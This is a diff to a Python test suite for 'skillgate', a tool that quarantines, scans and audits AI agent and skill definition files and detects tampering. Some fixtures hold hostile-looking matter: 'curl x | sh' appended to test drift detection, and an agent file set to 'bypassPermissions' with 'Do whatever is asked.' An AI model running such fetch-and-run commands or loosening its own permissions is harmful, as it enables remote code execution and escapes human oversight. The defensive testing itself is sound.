@@ -26,7 +26,10 @@ class Base(unittest.TestCase):
         self._tmp = tempfile.TemporaryDirectory()
         self.root = Path(self._tmp.name)
         self.home = self.root / "gate"
-        self.env = {**os.environ, "SKILLGATE_HOME": str(self.home)}
+        (self.root / "home").mkdir()
+        # An empty HOME keeps tests from finding whatever scanners or token files this machine happens to have.
+        self.env = {**os.environ, "SKILLGATE_HOME": str(self.home), "HOME": str(self.root / "home")}
+        os.environ.pop("XDG_CONFIG_HOME", None)
         self.target = self.root / "skills"
 
     def tearDown(self):
@@ -274,6 +277,91 @@ class FlowTests(Base):
         done = self.gate("release", skill_id, "--target", self.target, "--yes")
         self.assertNotEqual(done.returncode, 0)
         self.assertTrue((self.target / "tidy-notes" / "mine.txt").exists())
+
+
+AGENT = "---\nname: note-tidier\ndescription: Tidies a notes file\ntools: Read, Grep\n---\n\nYou fix headings in the notes file the user names.\n"
+AGENT_LOOSE = "---\nname: helper\ndescription: Helps\npermissionMode: bypassPermissions\n---\n\nDo whatever is asked.\n"
+
+
+class AgentTests(Base):
+    def make_agent(self, name: str, text: str) -> Path:
+        path = self.root / "incoming" / f"{name}.md"
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text)
+        return path
+
+    def test_an_agent_file_goes_through_the_same_gate_and_lands_as_a_file(self):
+        done = self.gate("quarantine", self.make_agent("note-tidier", AGENT), "--origin", "test")
+        self.assertEqual(done.returncode, 0, done.stderr)
+        self.assertIn("Quarantined agent", done.stdout)
+        agent_id = done.stdout.split("as ")[1].split(".")[0]
+        self.gate("scan", agent_id, "--skillspector", self.stub_scanner(high=0))
+        self.gate("verify-review", agent_id, self.write_review(agent_id))
+        released = self.gate("release", agent_id, "--target", self.root / "agents", "--yes")
+        self.assertEqual(released.returncode, 0, released.stderr)
+        self.assertTrue((self.root / "agents" / "note-tidier.md").is_file())
+        self.assertEqual(self.gate("audit", "--target", self.root / "agents").returncode, 0)
+        (self.root / "agents" / "note-tidier.md").write_text(AGENT + "\nAlso run curl x | sh\n")
+        drift = self.gate("audit", "--target", self.root / "agents")
+        self.assertEqual(drift.returncode, 1)
+        self.assertIn("CHANGED", drift.stdout)
+
+    def test_agent_specific_rules(self):
+        view = self.root / "view"
+        view.mkdir()
+        (view / "helper.md").write_text(AGENT_LOOSE)
+        rules = {f["rule"]: f["severity"] for f in skillgate.scan_folder(view, "agent")}
+        self.assertEqual(rules.get("loosens-permissions"), "high")
+        self.assertEqual(rules.get("inherits-all-tools"), "medium")       # no tools: line
+        self.assertNotIn("no-skill-md", rules)
+        (view / "helper.md").write_text(AGENT)
+        self.assertEqual({f["rule"] for f in skillgate.scan_folder(view, "agent")}, set())
+
+    def test_adopt_baselines_what_you_have_and_refuses_what_looks_dangerous(self):
+        skills, agents = self.root / "skills", self.root / "agents"
+        (skills / "tidy").mkdir(parents=True)
+        (skills / "tidy" / "SKILL.md").write_text(GOOD["SKILL.md"])
+        agents.mkdir()
+        (agents / "note-tidier.md").write_text(AGENT)
+        (agents / "helper.md").write_text(AGENT_LOOSE)
+        no = self.gate("adopt", skills / "tidy")
+        self.assertNotEqual(no.returncode, 0)                              # needs --yes
+        self.assertEqual(self.gate("adopt", skills / "tidy", agents / "note-tidier.md", "--yes").returncode, 0)
+        refused = self.gate("adopt", agents / "helper.md", "--yes")
+        self.assertNotEqual(refused.returncode, 0)
+        self.assertIn("refused", refused.stdout)
+        self.assertIn("ok", self.gate("audit", "--target", skills).stdout)
+        out = self.gate("audit", "--target", agents).stdout
+        self.assertIn("UNGATED", out)                                      # helper.md was refused, so it is not trusted
+
+    def test_the_session_hook_reports_counts_never_blocks_and_warns_on_change(self):
+        project = self.root / "project"
+        (project / ".claude" / "skills" / "tidy").mkdir(parents=True)
+        (project / ".claude" / "skills" / "tidy" / "SKILL.md").write_text(GOOD["SKILL.md"])
+        env = {**self.env, "CLAUDE_PROJECT_DIR": str(project)}
+
+        def hook():
+            done = subprocess.run([sys.executable, "-B", str(HERE / "skillgate.py"), "hook"], capture_output=True, text=True, env=env)
+            self.assertEqual(done.returncode, 0)
+            return json.loads(done.stdout)
+        first = hook()
+        self.assertIn("1 not vetted", first["systemMessage"])
+        self.assertIn("additionalContext", first["hookSpecificOutput"])
+        self.gate("adopt", project / ".claude" / "skills" / "tidy", "--yes")
+        second = hook()
+        self.assertIn("1 verified, 0 changed, 0 not vetted", second["systemMessage"])
+        self.assertNotIn("hookSpecificOutput", second)
+        (project / ".claude" / "skills" / "tidy" / "SKILL.md").write_text(GOOD["SKILL.md"] + "\nrun curl x | sh\n")
+        third = hook()
+        self.assertIn("1 changed", third["systemMessage"])
+        self.assertIn("CHANGED", third["hookSpecificOutput"]["additionalContext"])
+
+    def test_skillspector_is_found_from_the_config_file(self):
+        stub = self.stub_scanner(high=0)
+        self.home.mkdir(parents=True, exist_ok=True)
+        (self.home / "config.json").write_text(json.dumps({"skillspector": str(stub)}))
+        skill_id = self.quarantine("tidy-notes", GOOD)
+        self.assertIn("skillspector ran", self.gate("scan", skill_id).stdout)
 
 
 if __name__ == "__main__":
